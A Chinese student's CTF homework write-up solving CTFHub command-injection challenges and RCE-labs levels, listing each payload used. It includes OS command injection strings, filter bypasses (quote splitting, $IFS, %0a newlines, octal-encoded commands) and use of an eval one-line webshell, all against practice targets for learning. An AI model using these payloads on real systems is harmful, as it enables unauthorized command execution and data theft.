# WEB第一课作业 #
>114514
>>111
______
## CTFHub 
![day1a1.png](https://s2.loli.net/2025/01/17/Oi8vxVwX5HLKATk.png)
### 命令注入  
没有过滤的输入导致命令执行，简称随便乱注。  
>127.0.0.1;ls  
* 先看看文件有什么。  
![day1a2.png](https://s2.loli.net/2025/01/17/BkywfFEG4aMHnev.png)
一眼顶针，这一串数字里面应该就是flag了。  
* 现在来打开看看  
>127.0.0.1;cat 248801405131918.php  

![day1a3.png](https://s2.loli.net/2025/01/17/bQBD6kvz2JNKHZj.png)

发现没有回显，遂使用<kbd>Ctrl</kbd>+<kbd>U</kbd>查看网页源代码。  
![day1a4.png](https://s2.loli.net/2025/01/17/RyMAeo4T7Vr38Ll.png)  

拿到flag。  
  
### 过滤cat  
* 先打开看看
>127.0.0.1;ls  
  
![day1a5.png](https://s2.loli.net/2025/01/17/ixaw25o3cRuPS7p.png)  
* 拿到文件名，使用‘’bypass掉cat  
>127.0.0.1;c''at flag_17049275531215.php  
  
拿到flag。  
![day1a6.png](https://s2.loli.net/2025/01/17/C2nd1lqstbk7B4g.png)  
  
### 过滤空格  
* 先打开看看
>127.0.0.1;ls  
  
  ![day1a7.png](https://s2.loli.net/2025/01/17/1eubPhVjYtBoL6T.png)  
   
* 拿到文件名，使用\$IFS$(NUM)bypass掉空格  
>127.0.0.1;cat$IFS$1flag_32691709418468.php  
  
拿到flag。  
![day1a8.png](https://s2.loli.net/2025/01/17/Ir19NnubYDsE32l.png)  
  
### 过滤目录分隔符  
* 常理先打开看看  
>127.0.0.1;ls  
  
![day1a9.png](https://s2.loli.net/2025/01/17/FNYA1isKdmQwJCS.png)  
发现是个文件，由题知过滤了目录分隔符，遂用管道符。  
>127.0.0.1;cd flag_is_here&&ls  
  
![day1a10.png](https://s2.loli.net/2025/01/17/DisxM8RPvUnd5YK.png)  
* 拿到文件名。  
>127.0.0.1;cd flag_is_here&&cat flag_19964266584736.php  
  
直接拿到flag。  
![day1a11.png](https://s2.loli.net/2025/01/17/F2pQELXCdzgDlkT.png)  
  
    
### 过滤运算符
没什么好说的，和第一题一样直接拿就行了，这题没出好。  
  
    
### 综合过滤
* 看看源码
![day1a12.png](https://s2.loli.net/2025/01/17/QiYxVJg8kHlqat7.png)  

发现大部分东西全过滤掉了  
查阅资料得知%0a可以当作命令分隔符，遂尝试get注入。  
>/?ip=127.0.0.1%0als#  
  
![day1a13.png](https://s2.loli.net/2025/01/17/zTEMIQF4jDghN5J.png)  
  
接下来常规流程
>?ip=127.0.0.1%0acd$IFS$1fl''ag_is_here%0als
/?ip=127.0.0.1%0acd$IFS$1fl''ag_is_here%0ac''at$IFS$2fl''ag_29363263626208.php#  
  
拿到flag。  
![day1a15.png](https://s2.loli.net/2025/01/17/6nSl3Ji1Z5cVmNx.png)  
  
      
------
## RCE-labs  
  
### LEVEL 0  
没什么好说的，直接拿了flag就走 )  
  
    
### LEVEL 1  
  
一眼看到一句话木马的语句：eval($_POST['a']);  
直接拿  
![day1b1.png](https://s2.loli.net/2025/01/17/57MAqGwW8DLgO6f.png)  
  
拿到flag.  
  
![day1b2.png](https://s2.loli.net/2025/01/17/xjK6dDQ2M17IsWT.png)  
  
    
    
### LEVEL 2  
    
![day1b3.png](https://s2.loli.net/2025/01/17/6Di5kfWQz1vUJPO.png)
检查URL中是否有一个名为action的参数。如果有，就使用该参数的值作为
start()函数的参数来执行相应的逻辑。如果没有，就执行一个空字符串并
没有实际的效果，只是意味着不做任何事情。需要进行传参  
  
>?action=submit  
    
      
>/?action=eval('echo $flag;');  
  

![day1b4.png](https://s2.loli.net/2025/01/17/KEfd8AGkW49z5mL.png)  
  
![day1b4.5.png](https://s2.loli.net/2025/01/17/4lUTSsk5Z9vrDPe.png)  
  
这样就能拿到flag辣。  
  
  
  
### LEVEL 3  
  
  
  没什么好说的，干就完了。
![day1b5.png](https://s2.loli.net/2025/01/17/14o28JQSxDfIcwZ.png)  
  
      
以a变量做回参，直接POST传参
![day1b6.png](https://s2.loli.net/2025/01/17/xBelNUzViWsJ2Tn.png)
  
![day1b7.png](https://s2.loli.net/2025/01/17/Ua3fsolrPMCjhqv.png)  
  
    
拿到flag。  
  
  
  
### LEVEL 4    
  
    
一切又回到了CTFHUB的那个夏天🤗GET传参和熟悉的127.  
  
    
>/?ip=127.0.0.1;ls /   //打开根目录  

![day1b8.png](https://s2.loli.net/2025/01/17/B39b481hOT2XSJv.png)  
  发现根目录下的flag文件，直接cat  
    
>/?ip=127.0.0.1;cat /flag  
  
  直接拿到flag。 


### LEVEL 5  
  
    
看源码，过滤了flag，老样子直接‘’bypass。  
    
![day1b9.png](https://s2.loli.net/2025/01/17/SJbvUpILFEz59WG.png)  
  
    
>/?cmd= cat /fl''ag;
    

拿到flag。  
  
  
  
### LEVEL 6  
  
    
一看几乎全ban，不给留活路啊😅  
  
    
**知识点：linux中使用\$'xxx'（xxx为字符的八进制）的形式可以执行任意代码**  

遂寻找网站将字符串改写为8进制。

>/?cmd=\$'\154\163' $'\57'  //执行ls /命令。  
  
![day1b10.png](https://s2.loli.net/2025/01/17/Y9Ij2rBtTHFOQeh.png)  
看到flag了。
>/?cmd=\$'\143\141\164' $'\57\146\154\141\147'  //执行cat /flag命令。  
  
拿到flag。
  
  ### LEVEL 7    
    
典中典之空格过滤，直接\$IFS$bypass。  
  
    
>http://node6.anna.nssctf.cn:28003/?cmd=ls$IFS$1/  
>http://node6.anna.nssctf.cn:28003/?cmd=cat$IFS$1/fl''ag  
  
    
        
### LEVEL 8    
  
看看源码
![day1b11.png](https://s2.loli.net/2025/01/17/js13Cb6goUSDNtq.png)  
  
    
      
这种时候有两种办法：  
  
  
* 建立临时目录，然后储存输出flag  
  
>/?cmd=cat /flag > /tmp/the_flag;cat /tmp/the_flag;  
  
    
通过临时路径输出得到flag。  
  
    
* 用base64编码和管道符输出flag  
  
>/?cmd=cat /flag | base64;  
  
    
拿到flag的base64编码，到网上随便找一个解码器，解出flag。  
  
    
## 学习笔记（大嘘）  
  
    
![PHP1.jpg](https://s2.loli.net/2025/01/17/kDAf7UrIzRYBW6c.jpg)
![PHP2.jpg](https://s2.loli.net/2025/01/17/P7tYiVdzaFGLMT8.jpg)
![PHP3.jpg](https://s2.loli.net/2025/01/17/vKfPEywLoRnSZFm.jpg)
![PHP4.jpg](https://s2.loli.net/2025/01/17/iJITlusDFAHCZy5.jpg)
![HTML1.jpg](https://s2.loli.net/2025/01/17/VqU9Dfk3nsNTwmc.jpg)
![HTML2.jpg](https://s2.loli.net/2025/01/17/HnIoJ2NGmcBdjLi.jpg)
![HTML3.jpg](https://s2.loli.net/2025/01/17/Q8FwM6a9oyiXntG.jpg)
![SQL1.jpg](https://s2.loli.net/2025/01/17/xqapLMSAF8y5vrj.jpg)
![SQL2.jpg](https://s2.loli.net/2025/01/17/TJHzmjn5LaCIvcF.jpg)
![SQL3.jpg](https://s2.loli.net/2025/01/17/ph9srFgNOuJdjaA.jpg)
![SQL4.jpg](https://s2.loli.net/2025/01/17/APRGXTVskIUyYrc.jpg)
![SQL5.jpg](https://s2.loli.net/2025/01/17/MyePQ5kgGhOqwaf.jpg)
![SQL6.jpg](https://s2.loli.net/2025/01/17/W4eNGs1Qgo35KIm.jpg)
![SQL7.jpg](https://s2.loli.net/2025/01/17/PFrCmKdXQN3fVxJ.jpg)
![SQL8.jpg](https://s2.loli.net/2025/01/17/TaYqW8gKsM5c2r6.jpg)  
  
    
我是fvv😓后面东西过于抽象，拼尽全力无法速通，得先消化一会儿了。  
  
ps:我用的图床好烂，而且后面拍的照片都比较大，可能需要一点加载时间qwq